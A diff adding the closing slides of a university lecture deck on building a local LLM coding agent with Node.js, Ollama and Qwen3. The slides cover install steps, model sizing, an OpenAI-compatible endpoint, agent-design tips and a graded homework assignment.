+            <tr><td class="accent2"><b>Qwen3 4B</b></td><td>~3–4 GB</td><td>any modern laptop</td><td>snappy ← demo</td></tr>
+            <tr><td class="good"><b>Qwen3 8B</b></td><td>~6–8 GB</td><td>16 GB laptop / M1–M3</td><td>comfortable, higher quality</td></tr>
+            <tr><td><b>Qwen3 14B</b></td><td>~10–12 GB</td><td>32 GB RAM / 12 GB GPU</td><td>usable</td></tr>
+            <tr><td><b>Qwen3 32B</b></td><td>~20–24 GB</td><td>32 GB+ / 24 GB GPU</td><td>slower, higher quality</td></tr>
+          </tbody>
+        </table>
+        <div class="cols3" style="margin-top:18px;">
+          <div class="card"><h3>GPU = speed</h3><p><small>A GPU mainly makes it <b>faster</b>, not smarter. CPU works, just fewer tokens/sec.</small></p></div>
+          <div class="card"><h3 class="accent2">Apple Silicon shines</h3><p><small>Unified memory lets M-series Macs run 8–14B models smoothly.</small></p></div>
+          <div class="card"><h3 class="good">Start small</h3><p><small>Begin at 4B; only size up (8B+) if the answers aren't good enough.</small></p></div>
+        </div>
+        <aside class="notes">Numbers are approximate for Q4_K_M. Context length also eats RAM (the KV cache) — long contexts add up.</aside>
+      </section>
+
+      <!-- 17. Install ollama -->
+      <section>
+        <h2>Step 1 — Install Ollama</h2>
+        <div class="cols">
+          <div>
+            <p class="step">macOS</p>
+            <pre><code data-trim data-noescape class="language-bash"># download the app from ollama.com
+# ...or with Homebrew:
+brew install ollama</code></pre>
+            <p class="step">Linux</p>
+            <pre><code data-trim data-noescape class="language-bash">curl -fsSL https://ollama.com/install.sh | sh</code></pre>
+            <p class="step">Windows</p>
+            <pre><code data-trim data-noescape class="language-bash"># download & run the installer
+# from ollama.com/download</code></pre>
+          </div>
+          <div>
+            <p class="step">Verify it's running</p>
+            <pre><code data-trim data-noescape class="language-bash">ollama --version
+# prints installed Ollama version
+
+# Ollama runs a local server at:
+#   http://localhost:11434
+# (the desktop app starts it automatically;
+#  otherwise run:  ollama serve )</code></pre>
+            <p class="muted"><small>That local server is what your Node agent will talk to.</small></p>
+          </div>
+        </div>
+      </section>
+
+      <!-- 18. pull qwen3 -->
+      <section>
+        <h2>Step 2 — Download &amp; run Qwen3</h2>
+        <pre><code data-trim data-noescape class="language-bash"># download the model (one-time; ~2.5 GB for the 4B demo model)
+ollama pull qwen3:4b
+
+# chat with it right in your terminal
+ollama run qwen3:4b
+>>> Write a Python function that reverses a string.
+
+# pick a size that fits your hardware:
+ollama pull qwen3:1.7b     # tiny  — old laptops / 8 GB RAM
+ollama pull qwen3:4b       # light  — great on a laptop (~2.5 GB)  ← demo
+ollama pull qwen3:8b       # default sweet spot (~5 GB)
+ollama pull qwen3:14b      # stronger, needs ~16 GB
+ollama pull qwen3:32b      # best quality, needs ~32 GB / good GPU</code></pre>
+        <table>
+          <thead><tr><th>Model</th><th>~Size on disk</th><th>Min RAM</th><th>Best for</th></tr></thead>
+          <tbody>
+            <tr><td>qwen3:1.7b</td><td>~1.4 GB</td><td>8 GB</td><td>Quick tasks, old laptops</td></tr>
+            <tr><td>qwen3:4b</td><td>~2.5 GB</td><td>8 GB</td><td>Light &amp; snappy on a laptop</td></tr>
+            <tr><td>qwen3:8b</td><td>~5 GB</td><td>16 GB</td><td>Great all-round default</td></tr>
+            <tr><td>qwen3:14b / 32b</td><td>~9–20 GB</td><td>16–32 GB</td><td>Best local coding quality</td></tr>
+          </tbody>
+        </table>
+      </section>
+
+      <!-- 19. openai compatible endpoint -->
+      <section>
+        <h2>Step 3 — Ollama speaks "OpenAI"</h2>
+        <p>Ollama exposes an <b class="accent">OpenAI-compatible API</b>, so your existing OpenAI SDK code works — just change the <code>baseURL</code>.</p>
+        <pre><code data-trim data-noescape class="language-bash"># quick test with plain curl:
+curl http://localhost:11434/v1/chat/completions -d '{
+  "model": "qwen3:4b",
+  "messages": [{ "role": "user", "content": "Say hi in 3 words" }]
+}'</code></pre>
+        <p class="muted"><small>Same request shape as OpenAI → same SDK → same agent loop. No rewrite needed.</small></p>
+      </section>
+
+      <!-- 20. point agent at ollama -->
+      <section>
+        <h2>Step 4 — Point your agent at Qwen3</h2>
+        <p>Remember our agent from Part 2? Change <span class="accent2">two lines</span> and it's now 100% local &amp; free:</p>
+        <pre><code data-trim data-noescape class="language-javascript">import OpenAI from "openai";
+
+const openai = new OpenAI({
+  baseURL: "http://localhost:11434/v1",  // ← point at Ollama
+  apiKey: "ollama",                      // ← required by SDK, but ignored
+});
+
+// ...the ENTIRE agent loop is unchanged — just switch the model:
+const res = await openai.chat.completions.create({
+  model: "qwen3:4b",                     // ← your local model
+  messages,
+  tools,                                 // Qwen3 supports tool calling
+});</code></pre>
+        <p class="good">Same 80-line agent. Zero cost. Nothing leaves your machine.</p>
+        <aside class="notes">Demo runs on Qwen3 4B — light and fast, and it handles tool calls well for this small agent. If tool-calling ever feels flaky, use a recent Ollama version and bump to 8B+. Keep tools few and descriptions crisp.</aside>
+      </section>
+
+      <!-- 21. recap -->
+      <section>
+        <h2>Recap — the mental model</h2>
+        <ul>
+          <li><b class="accent">LLM</b> = a next-token predictor trained at massive scale.</li>
+          <li><b class="accent">Agent</b> = LLM + <b>tools</b> + a <b>loop</b> + a <b>goal</b>.</li>
+          <li>The loop: <span class="muted">think → (tool call) → act → observe → repeat → answer.</span></li>
+          <li>In Node.js it's ~80 lines: define tools, run the loop, feed results back.</li>
+          <li>Swap cloud ↔ local by changing the <code>baseURL</code> and <code>model</code> — the logic never changes.</li>
+          <li><b class="good">Ollama + Qwen3</b> = the same agent, free, private, offline.</li>
+        </ul>
+      </section>
+
+      <!-- 21b. secret sauce (techniques) -->
+      <section>
+        <h2>The "secret sauce" of great agents</h2>
+        <p class="muted">Our small loop works. Here's what tools like Claude Code add to make it <i>reliable</i>:</p>
+        <div class="anat" style="grid-template-columns: repeat(3, 1fr); margin-top:8px;">
+          <div class="card"><span class="ico">🧭</span><h3 class="accent">Context engineering</h3></div>
+          <div class="card"><span class="ico">🧩</span><h3 class="accent">MCP tools</h3></div>
+          <div class="card"><span class="ico">🌿</span><h3 class="accent">Sub-agents</h3></div>
+          <div class="card"><span class="ico">🛡️</span><h3 class="accent">Permissions</h3></div>
+          <div class="card"><span class="ico">🗜️</span><h3 class="accent">Compaction</h3></div>
+          <div class="card"><span class="ico">🔧</span><h3 class="accent">Sharp tools</h3></div>
+        </div>
+        <p class="muted" style="text-align:center;"><small>Inspired by Stanford <b>CS146S — The Modern Software Developer</b> · themodernsoftware.dev</small></p>
+        <aside class="notes">Context engineering — front-load the right info; re-inject rules via system reminders to fight context drift. MCP (Model Context Protocol) — a standard plug for external tools &amp; data (GitHub, DBs, Slack…); next session's topic. Sub-agents — spawn helpers for parallel work so one context doesn't overload. Permissions — parse command prefixes, allow-list, ask before risky actions. Compaction — trim/summarize history to stay within the window on long runs. Sharp tools — a few well-described tools beat many fuzzy ones.</aside>
+      </section>
+
+      <!-- 21c. roadmap to Claude Code -->
+      <section>
+        <h2>Roadmap — from mini-agent to "Claude Code"</h2>
+        <p class="muted">Level up the same loop one layer at a time:</p>
+        <div class="loop" style="font-family: Inter, system-ui, sans-serif; line-height: 2.05;">
+          <span class="step">1.</span> <b>MVP loop</b> — read · write · run · the while-loop&nbsp;&nbsp;<span class="good">← you built this</span><br/>
+          <span class="step">2.</span> <b>Better tools</b> — edit (str-replace) · grep · glob · git · <b class="accent">MCP servers</b><br/>
+          <span class="step">3.</span> <b>Safety</b> — approval prompts · sandbox · command allow-list<br/>
+          <span class="step">4.</span> <b>Context</b> — system reminders · <b class="accent">compaction</b> · sub-agents<br/>
+          <span class="step">5.</span> <b>UX</b> — streaming · TUI with diffs · sessions &amp; memory<br/>
+          <span class="accent2" style="font-size:1.2em;">➜</span> <b class="good">A Claude Code–class agent</b> 🎉
+        </div>
+        <p class="muted"><small>Every layer is optional and additive — the core loop never changes. Study real ones: <b>Claude Code</b>, Aider, Cline.</small></p>
+      </section>
+
+      <!-- 22. next steps + resources -->
+      <section>
+        <h2>Where to go next</h2>
+        <p class="muted">You have the whole mental model — now make it yours. Three things to try tonight:</p>
+        <div class="anat" style="grid-template-columns: repeat(3, 1fr); margin-top:8px;">
+          <div class="card"><span class="ico">🔑</span><h3 class="good">Build it</h3><p>Run the agent with your own API key and give it a real task.</p></div>
+          <div class="card"><span class="ico">🔌</span><h3 class="good">Go offline</h3><p>Point <code>baseURL</code> at Qwen3 on Ollama — zero cost, fully local.</p></div>
+          <div class="card"><span class="ico">🛠️</span><h3 class="good">Extend it</h3><p>Add one tool: <code>git</code>, web search, or line-level edit.</p></div>
+        </div>
+        <div class="cols" style="margin-top:20px; gap:22px;">
+          <div class="card">
+            <h3 class="accent">📚 Docs</h3>
+            <p><small>ollama.com/library · docs.claude.com · platform.openai.com/docs · ai.google.dev</small></p>
+          </div>
+          <div class="card">
+            <h3 class="accent">🔍 Study real agents</h3>
+            <p><small><b>Claude Code</b> · Aider · Cline · OpenCode — read their loops, steal their ideas.</small></p>
+          </div>
+        </div>
+      </section>
+
+      <!-- 22b. HOMEWORK — part 1: what to build -->
+      <section>
+        <div class="kicker">Assignment · 1 / 2</div>
+        <h2>📝 Homework — what to build</h2>
+        <div class="cols" style="gap:24px;">
+          <div class="card">
+            <h3 class="good">Core requirements</h3>
+            <ul style="font-size:0.82em;">
+              <li>A <b>CLI tool</b> — chat with the agent in the terminal</li>
+              <li>Powered by <b>Ollama + Qwen3</b> (local)</li>
+              <li>Switch model via <b><code>config.json</code></b> — no code change</li>
+              <li><b>Run &amp; demo</b> on your own machine</li>
+            </ul>
+            <pre style="font-size:0.38em; margin:6px 0 0;"><code data-trim data-noescape class="language-json">{
+  "provider": "ollama",
+  "baseURL":  "http://localhost:11434/v1",
+  "model":    "qwen3:4b",
+  "apiKey":   "ollama"
+}</code></pre>
+          </div>
+          <div class="card">
+            <h3 class="accent">Tools to implement</h3>
+            <ul style="font-size:0.74em;">
+              <li><b>File (main):</b> <code>read_file</code> · <code>write_file</code> · <code>list_files</code> · <code>edit_file</code> · <code>create_dir</code> / <code>delete_file</code><br/>
+                <span class="muted" style="font-size:0.9em;">↳ must stay <b>inside the workspace folder</b> — block <code>..</code> / paths that escape it</span></li>
+              <li><b><code>run_command</code></b> — run a shell command<br/>
+                <span class="muted" style="font-size:0.9em;">↳ <b>ask the user to approve</b> before running</span></li>
+              <li><b>Session</b> — keep the conversation <b>in memory</b> across turns</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+      <!-- 22c. HOMEWORK — part 2: submit, rules, grading -->
+      <section>
+        <div class="kicker">Assignment · 2 / 2</div>
+        <h2>📝 Homework — submit &amp; grading</h2>
+        <div class="cols3" style="gap:18px;">
+          <div class="card">
+            <h3 class="accent">Demo &amp; submit</h3>
+            <ul style="font-size:0.82em;">
+              <li>🎥 Record a short demo, upload to <b>YouTube</b></li>
+              <li>📤 Submit the <b>YouTube link</b> + <b>source code</b> on <b>Moodle</b></li>
+            </ul>
+          </div>
+          <div class="card">
+            <h3 class="accent2">Rules</h3>
+            <ul style="font-size:0.82em;">
+              <li><b>Any</b> programming language</li>
+              <li>AI coding assistants <b>allowed</b></li>
+              <li>Free tiers / <b>local models</b> allowed (e.g. Ollama&nbsp;+&nbsp;Qwen3, or a provider free tier)</li>
+            </ul>
+          </div>
+          <div class="card">
+            <h3 class="good">Grading (100%)</h3>
+            <table style="font-size:0.5em; margin:0;">
+              <tbody>
+                <tr><td>Core agent loop (Ollama + Qwen3)</td><td class="accent2"><b>35%</b></td></tr>
+                <tr><td>File tools working &amp; confined to workspace</td><td class="accent2"><b>25%</b></td></tr>
+                <tr><td>Session (in-memory) + <code>run_command</code> approval</td><td class="accent2"><b>15%</b></td></tr>
+                <tr><td>Model switch via <code>config.json</code></td><td class="accent2"><b>10%</b></td></tr>
+                <tr><td>Demo video &amp; submission</td><td class="accent2"><b>15%</b></td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+
+      <!-- 23. THANK YOU -->
+      <section class="title" data-background-color="#0f1319">
+        <div class="kicker">That's a wrap</div>
+        <h1>Now go build one 🚀</h1>
+        <p class="muted">LLM → Agent → Node.js → Ollama + Qwen3. You have everything you need.</p>
+        <p><span class="pill">Questions?</span></p>
+        <div class="author">
+          <strong>Kha Do</strong> · FIT-HCMUS · <span class="accent">dnkha@fit.hcmus.edu.vn</span>
+        </div>
+      </section>
+
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/highlight.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/notes/notes.js"></script>
+  <script>
+    Reveal.initialize({
+      hash: true,
+      slideNumber: "c/t",
+      transition: "slide",
+      width: 1280,
+      height: 800,
+      margin: 0.06,
+      plugins: [RevealHighlight, RevealNotes],
+    });
+  </script>
+</body>
+</html>
